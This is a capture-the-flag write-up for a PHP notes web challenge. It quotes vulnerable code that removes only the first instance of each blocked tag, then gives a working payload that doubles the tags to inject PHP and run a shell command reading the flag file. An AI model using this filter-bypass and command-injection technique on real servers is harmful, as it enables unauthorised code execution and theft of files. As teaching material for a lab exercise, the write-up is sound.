# ProgrammersHateProgramming - Web challenge

When opening the provided web page, we see an input field to create new notes and 2 pre-defined notes.
We were given the source code which reveals, that for every incoming POST request with a `notewrite` data field, the application (written in php) creates a new file with the contents of the note.
At first there are some filters applied though, which hint to injecting either javascript via a XSS or injecting server-side
rendered php, which makes a lot more sense, since there is no bot visiting our notes.



```php
<?php
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<script>", "", $notetoadd);
    $notetoadd = str_replace_first("</script>", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $filename = generateRandomString();
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
?>
```
The source code pretty obviously reveals, that only the first instance of the blocked strings are actually replaced with an empty string, so we can just put everything twice in the payload!

I then intercepted the POST request using [burpsuite](https://portswigger.net/burp/communitydownload) and added my payload into the notewrite data-field

**Payload**
```
notewrite=<?php+<?php
// flag
echo+`cat /flag.php`
?>+?>
```

The comment with just `flag` gets removed which causes the actually used flag to stay. 
For the ones not familiar with php, the backticks (\`\`) execute the string using the shell and return the output.
(Don't forget to url-encode your exploit using `CTR+U` in burpsuite!)
Then send the post request and visit the newly created note to see the *flag*!
